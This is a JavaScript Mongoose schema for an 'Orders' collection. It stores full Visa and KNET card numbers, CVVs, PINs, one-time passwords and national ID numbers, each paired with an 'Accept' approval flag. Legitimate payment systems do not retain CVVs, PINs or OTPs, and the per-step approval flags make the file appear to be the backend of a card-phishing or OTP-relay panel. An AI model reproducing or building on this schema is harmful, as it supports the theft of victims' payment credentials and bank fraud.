const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      type: String,
      phone: String,
      price: String,

      visa_card_number: String,
      visa_card_holder_name: String,
      visa_cvv: String,
      visa_expiryDate: String,
      visaAccept: {
        type: Boolean,
        default: false,
      },

      visa_otp: String,
      visaOtpAccept: {
        type: Boolean,
        default: false,
      },

      visa_pin: String,
      visaPinAccept: {
        type: Boolean,
        default: false,
      },

      kynet_bank: String,
      kynet_card_number: String,
      kynet_start: String,
      kynet_card_expire: String,
      kynet_pin: String,
      kynetAccept: {
        type: Boolean,
        default: false,
      },
      kynet_otp: String,
      kynetOtpAccept: {
        type: Boolean,
        default: false,
      },

      kynet_cvv: String,
      kynetCVVAccept: {
        type: Boolean,
        default: false,
      },

      ID_number: String,
      ID_numberAccept: {
        type: Boolean,
        default: false,
      },

      verify_order: String,
      VerifyOrderAccept: {
        type: Boolean,
        default: false,
      },

      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
